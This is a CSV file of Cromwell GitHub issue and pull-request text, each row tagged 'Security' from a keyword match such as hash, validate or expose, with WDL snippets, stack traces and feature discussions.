Security,Implement call caching hashing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1230:23,hash,hashing,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1230,1,['hash'],['hashing']
Security,Implement hashing for JES PBE,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/809:10,hash,hashing,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/809,1,['hash'],['hashing']
Security,Implement the /describe endpoint as described in design docs. . The goal of this work is to make it easier for services like FireCloud & Saturn to adopt & expose new WDL language features more easily/quickly.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4441:155,expose,expose,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4441,1,['expose'],['expose']
Security,"Implement the `/describe` endpoint as described in the doc and discussed with @ruchim. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4333:841,PASSWORD,PASSWORDS,841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4333,1,['PASSWORD'],['PASSWORDS']
Security,Implement the validate functionality for /describe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4433:14,validat,validate,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4433,1,['validat'],['validate']
Security,Implementation details exposed in normal command-line output,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4062:23,expose,exposed,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4062,1,['expose'],['exposed']
Security,Improve AWS Integration:. - Docker Hub Authentication; - awsBatchRetryAttempts; - ulimits; - Call Caching with ECR private ([geertvandeweyer](https://github.com/geertvandeweyer) and [markjschreiber](https://github.com/markjschreiber/cromwell/)); - revised localization functions to improve stability ([geertvandeweyer](https://github.com/geertvandeweyer)); - Extra failure handling for Batch ([geertvandeweyer](https://github.com/geertvandeweyer)); - AWS/Batch error handling improvements ([geertvandeweyer](https://github.com/geertvandeweyer)); - Correct retry logic for spot kills ([geertvandeweyer](https://github.com/geertvandeweyer)); - handling of very rare early/late job killing ([geertvandeweyer](https://github.com/geertvandeweyer)); - Sychronize multipart uploads between callcache and jobscripts ([geertvandeweyer](https://github.com/geertvandeweyer)),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6835:39,Authenticat,Authentication,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6835,1,['Authenticat'],['Authentication']
Security,Improve output of womtool validate,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4040:26,validat,validate,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4040,1,['validat'],['validate']
Security,"Improves our ""munge this NIO path string into what Cromwell expects"" logic to handle paths that were initially passed into the Azure NIO library as full `http://` paths. I also added a config path (unpublished, intended for devs only) for passing a token through to TES requests. This enables us to locally submit work to a TES server in a (modified to expose TES) instance of the Azure app.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7138:353,expose,expose,353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7138,1,['expose'],['expose']
Security,"In Google Compute Engine, one can create custom networks and even delete the default network. ; Docs: https://cloud.google.com/vpc/docs/using-vpc; List of networks: https://console.cloud.google.com/networking/networks/list. This is commonly done for projects that have high security requirements to enforce firewalls etc. The ability to specify a network where operations are created is supported in v2alpha1, but there is no place to specify it in Cromwell (which always uses the ""default"" network). AC: Add an option to Cromwell's global config where a user can specify the VPC network name, for the PAPI v2 backend. This would override the current ""default"" network used by Cromwell. Testing Criteria:; - Confirm that Cromwell honors using a non-default network when specified via the config.; - If the network name specified doesn't exist, the error returned to the user contains information about 1) a link to documentation on how to create a network and 2) how to confirm a network exists through the cloud console.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4017:274,secur,security,274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4017,2,"['firewall', 'secur']","['firewalls', 'security']"
Security,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:162,validat,validates,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827,1,['validat'],['validates']
Security,"In a scatter of 20500 shards, we ran a task that basically took in one file input and output a glob of files. We first tried this with a glob where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:764,secur,security,764,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,3,['secur'],['security']
Security,"In at least one example (I have the workflow & broad accessible inputs if someone needs them) the following leads to a cache miss:. Workflow A, Task A: Output is multipart uploaded to S3 and has an etag to match; Workflow A, Task B: Consumes this file as an input. Workflow B, Task A: Cache hit. Copies that file, but receives an md5 etag; Workflow B, Task B: Cache miss - the two etags are now mismatched. It seems highly likely that a solution to this would also solve #4805",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828:53,access,accessible,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828,1,['access'],['accessible']
Security,"In case someone is looking to acheive this: The ~wdl task that runs as part of configuration has access to 'job_name'. I have passed this through as an environment variable. . ```; submit-docker = """"""; docker run \; --entrypoint ${job_shell} \; -e CROMWELL_JOB_NAME=${job_name} \; ```. Side note it would be nice if the variables available to that conf script were documented - I am reverse engineering from the example configs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-426880721:97,access,access,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-426880721,1,['access'],['access']
Security,"In certain cases, cromwell/wdltool is unable to resolve call statements in subworkflows (cromwell v29, wdltool v0.14). This may be related to #2753. A simple case to demonstrate this:. main.wdl:; ```; import ""sub.wdl"" as sub; workflow main {; call sub.wf; }; ```. sub.wdl:; ```; workflow wf {; call a; String b = a.out; }. task a {; command {; echo ""hello""; }; output {; String out = read_string(stdout()); }; }; ```; Running the validate command against sub.wdl returns no error messages. Running validate against main.wdl returns:; ```; ERROR: Missing value or call: Couldn't find value or call with name 'a' in workflow (line 4):. String b = a.out; ^; ```; Interestingly, if I add to sub.wdl:; ```; task b {; String msg; command {; echo ${msg}; }; output {; String out = read_string(stdout()); }; }; ```; and replace String b=a.out with:; ```; call b { input: msg=a.out }; ```; it validates ok. Am I doing something wrong with the WDL? Or is there a workaround for this?. My actual use case is a bit more complex - I have a series of mutually exclusive optional cases, so I want to put the File? output from each into an Array, and then use the select_first. But when I try to create the array from the outputs:; ```; if (a_condition) {; call task_a; }; if (b_condition) {; call task_b; }; ...; Array[File?] files = [task_a.out, task_b.out ...]; File file = select_first(files); ```; I see the above manifestation/error message.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2756:430,validat,validate,430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2756,3,['validat'],"['validate', 'validates']"
Security,"In https://github.com/broadinstitute/cromwell/pull/4502 I ignored three tests related to the refresh token functionality because they were blocking all other merges and I had no idea how to fix them. My rationale for doing so is my impression the feature is unused/end-of-life. @ruchim to decide whether we; 1. Fix the tests; or; 2. Delete the feature . <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4504:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4504,1,['PASSWORD'],['PASSWORDS']
Security,"In other words, we should validate `docker` as an optional string so that we can do things like this:. ```; task foo {; String? dockerName; command { ... }; runtime {; docker: dockerName; }; output { ... }; }; ```. The expected behaviour here is:; - If `dockerName` is set, use docker and use the specified image name; - If `dockerName` is not set, do not use docker.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832:26,validat,validate,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832,1,['validat'],['validate']
Security,"In terms of demonstrating concurrency, I'd be happy with having the code currently in the `CheckExecutionStatus` handler log the calls it thinks are runnable and having the test scrape the logs to validate correctness. Initially this should be just `ps`, subsequently it should be both `cgrep` and `wc` **at the same time**. I don't care if `cgrep` and `wc` actually run at the same time, I just care that this logic realizes they both become runnable at the same time. Making these things actually run concurrently would likely be fairly involved, especially given my currently weak Akka TestKit-fu.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297:197,validat,validate,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297,1,['validat'],['validate']
Security,"In the MaterializeWDA, the `validateDeclarations` method now uses `NoFunctions` which prevents evaluation of workflow level declaration with `read_string` etc...; The way of achieving this may be different in WOM-world but this functionality must remain.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2625:28,validat,validateDeclarations,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2625,1,['validat'],['validateDeclarations']
Security,"In the cromwell README...; ```wdltool 0.4```. ```; import ""sub_wdl.wdl"" as sub. workflow main_workflow {. call sub.hello_and_goodbye { input: hello_and_goodbye_input = ""sub world"" }. # call myTask { input: hello_and_goodbye.hello_output }. output {; # I believe this will cause a validation failure. This is what is currently in the README...; String main_output = hello_and_goodbye.hello_output. # I believe this will NOT cause a validation failure. ; hello_and_goodbye.hello_output; }; }; ```. My real-world example:. ```; workflow dl_ob_training {. File bam_file; File bam_file_index; File gatk_jar; File ref_fasta; File oncotated_m1; String entity_id; File createOxoGIntervalList. call CollectSequencingArtifactMetrics {; input:; entity_id=entity_id,; bam_file=bam_file,; output_location_prepend=entity_id,; gatk_jar=gatk_jar,; ref_fasta=ref_fasta; }. call CreateObIntervalList {; input:; oncotated_m1=oncotated_m1,; entity_id=entity_id,; createOxoGIntervalList=createOxoGIntervalList; }. call ExtractReadInfo {; input:; bam_file=bam_file,; bam_file_index=bam_file_index,; gatk_jar=gatk_jar,; ref_fasta=ref_fasta,; pre_adapter_file=CollectSequencingArtifactMetrics.pre_adapter_detail_metrics,; interval_list=CreateObIntervalList.interval_list,; }. output {; # VALIDATES; ExtractReadInfo.read_infos. # DOES NOT VALIDATE; Array[File] read_infos = ExtractReadInfo.read_infos; }; }; .....snip.... task ExtractReadInfo {; File gatk_jar; File pre_adapter_file; File interval_list; File bam_file; File bam_file_index; File ref_fasta. command {; java -jar ${gatk_jar} ExtractReadInfo \; -P ${pre_adapter_file} \; -L ${interval_list} \; -I ${bam_file} \; -R ${ref_fasta} \; -OP out/; }. output {; Array[File] read_infos = glob(""out/*""); }; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837:280,validat,validation,280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837,4,"['VALIDAT', 'validat']","['VALIDATE', 'VALIDATES', 'validation']"
Security,"In the example configuration, the submit-docker tries to run. docker run ... ${docker} ${script}. but ${script} will not be accessible from the docker image unless, by coincidence, the location where we are running from in the local filesystem is the same as the dockerRoot. What we want to run instead is . docker run .... ${docker} ${docker_script}. Since this is the default configuration, it has the potential to cause a lot of unnecessary confusion (eg for me)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5015:124,access,accessible,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5015,1,['access'],['accessible']
Security,"In the near future PAPI will support the ability to pass a boolean argument called `restrictMetadataAccess`. We want to expose this both via workflow option as well as the ability to set the default value to `true` (although normally the default value should be `false`). The mechanism to specify this to PAPI is still TBD, so hit me up for more details when you get to that point.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2424:120,expose,expose,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2424,1,['expose'],['expose']
Security,"In the scatter PR I needed to create a ""Workflow level WDL functions"" (or whatever we want to call it) to evaluate the scatter collection expression, and I gave it the default local filesystem, which effectively makes this supported. ; https://github.com/broadinstitute/cromwell/pull/818/files#diff-04167311d295d2ed1ab92a70830d9a8dR19. Should I remove it until we figure out if this is a potential security flaw ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461055:398,secur,security,398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461055,1,['secur'],['security']
Security,"Including a new setting under _""virtual-private-cloud""_ to support the **host project** in a _shared vpc environment_ and detailed here: https://cloud.google.com/vpc/docs/shared-vpc. Currently validating in our own environment.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6225:193,validat,validating,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225,1,['validat'],['validating']
Security,"Indeed, the following workflow:; ```; $ echo 'version development. workflow main {; input {; Directory d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:201,validat,validate,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228,1,['validat'],['validate']
Security,Initial support for DRS (DOS) filesystem: Size and File Hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4456:56,Hash,Hash,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4456,1,['Hash'],['Hash']
Security,"Initially, this PR was aimed to fix issue #5085. But it turned out that there are other related issues.; It looks like [test case](https://github.com/broadinstitute/cromwell/issues/4969#issuecomment-492445214) made by @jeremiahsavage in issue #4969 has nothing to do with a zip file subdirectories. At least his test works fine if you apply the changes made in this PR.; Another issue described in [JIRA](https://broadworkbench.atlassian.net/browse/BA-5873). Although workflows fail and throw an exception even with changes in this PR, the exception is different. The exact reason is unclear for me, but this workflow fails even when you submit a task in a server mode, so maybe something is wrong with the workflow. It turns out the problem with running CWL files on Cromwell was caused by this [PR](https://github.com/broadinstitute/cromwell/pull/3988).; Something was changed in this PR, which required changes to the [`validateSubmitArguments`](https://github.com/broadinstitute/cromwell/pull/3988/files#diff-9ed42892250e1b424f671593631297a5R174) method of the `CromwellEntryPoint` object. But since the [`validateRunArguments`](https://github.com/broadinstitute/cromwell/pull/3988/files#diff-9ed42892250e1b424f671593631297a5R201) method is almost identical to the `validateSubmitArguments` method, similar changes should have been made there too. But this was not noticed, and therefore this problem arose. Therefore, to fix the issues it is enough to use in the `validateRunArguments` method the same logic as in the `validateSubmitArguments` method.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104:923,validat,validateSubmitArguments,923,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104,5,['validat'],"['validateRunArguments', 'validateSubmitArguments']"
Security,Inject metadata about workflow run into workflow step?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137:0,Inject,Inject,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137,1,['Inject'],['Inject']
Security,"Inspired by https://github.com/broadinstitute/cromwell/compare/rsa_ss_crom_6443, this should stop workflows from being deleted from the workflow store before their final metadata has been written to the database. * Workflows now request confirmation on the push of their final status to metadata.; * Workflows are not removed from the WorkflowStore until that confirmation happens. Bonus:. * Workflow actor states that follow on from completion (like log copying, output copying, metadata integrity checking, ...) are now recorded as ""Finalizing"" in metadata.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6196:489,integrity,integrity,489,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6196,1,['integrity'],['integrity']
Security,"Instrumentation was scheduled on a timer out of band of the actor's thread, and in some cases accessing non thread safe state inside the actor (in a read only fashion but still it can cause incoherent values: https://stackoverflow.com/questions/37690525/multiple-threads-checking-map-size-and-conccurency); Instead use messages to self to schedule instrumentation on the actor's thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4402:94,access,accessing,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4402,1,['access'],['accessing']
Security,"Interesting point!. I like the ~~idea~~ philosophy of CC tables being engine only, and queries being completely and solely calculable from metadata. It would probably mean ~~piping~~ forwarding all CC hashes, toggles of ""allowResultReuse"", failures to copy results, etc to the metadata.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306897781:201,hash,hashes,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306897781,1,['hash'],['hashes']
Security,Invalid WDL validates,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2394:12,validat,validates,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2394,1,['validat'],['validates']
Security,Investigate File Hashing Strategy for JES Backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1623:17,Hash,Hashing,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1623,1,['Hash'],['Hashing']
Security,Investigate call caching file hash caching,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4096:30,hash,hash,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4096,1,['hash'],['hash']
Security,Investigate potentially premature JSON validation for workflow submission,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882:39,validat,validation,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882,1,['validat'],['validation']
Security,Invocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.net.SocketTimeoutException: Read timed out; 	at java.net.SocketInputStream.socketRead0(Native Method); 	at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); 	at java.net.SocketInputStream.read(SocketInputStream.java:171); 	at java.net.SocketInputStream.read(SocketInputStream.java:141); 	at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); 	at sun.security.ssl.InputRecord.read(InputRecord.java:503); 	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); 	at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); 	at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); 	at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); 	at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); 	at java.io.BufferedInputStream.read(BufferedInputStream.java:345); 	at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1569); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1474); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:3807,secur,security,3807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['secur'],['security']
Security,"Is the FoFN itself important, or is it more about inputting things without localizing them? We were considering earlier something like a `FileRef` type:; ```; workflow foo {; Array[Int] indices; scatter (i in indices) {; call mkfile { input: mkfile_input = i }; }; call use_files { input: fileRefs = mkfile.f }; }. task mkfile {; Int mkfile_input; command { ... }; output {; File f = outfile; }; }. task use_files {; Array[FileRef] fileRefs; command { ... }; }; ```. The `FileRef` would be hashed like a `File` for call caching but not localized by Cromwell to run the task",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305898548:490,hash,hashed,490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305898548,1,['hash'],['hashed']
Security,Is there an equivalent for JES runtime attributes validation that could need an update as well ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264853068:50,validat,validation,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264853068,1,['validat'],['validation']
Security,"Is there an example of how to set call caching to true and allowResultReuse to true in the `-o options` file when running a workflow. I am looking for examples and the documentation and I just keep guessing. Both ways of setting outside of `callCaching` and inside still have my `-m metadata` file showing below:; ```. ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. options.json file:; ```; {; 	""default_runtime_attributes"": {; 		""write_to_cache"": true,; 		""read_from_cache"": true,; 		""system.file-hash-cache"": true,; 		""allowResultReuse"" : true,; 		""callCaching"": {; 			""hit"": false,; 			""effectiveCallCachingMode"": ""ReadAndWriteCache"",; 			""result"": ""Cache Miss"",; 			""allowResultReuse"": true; 		}; 	}; }; ```. EDIT:; This only worked by creating a config file with lines:; ```; call-caching {; enabled = true; }; ```; If this is required, shouldn't this documentation [page](https://cromwell.readthedocs.io/en/stable/wf_options/Overview/) include that information under section ""Call Caching Options""?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913:552,hash,hash-cache,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913,1,['hash'],['hash-cache']
Security,"It can run the task without having its hash, it just won't try to call cache it nor write it to the cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808:39,hash,hash,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808,1,['hash'],['hash']
Security,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:85,expose,exposed,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833,2,"['access', 'expose']","['accessed', 'exposed']"
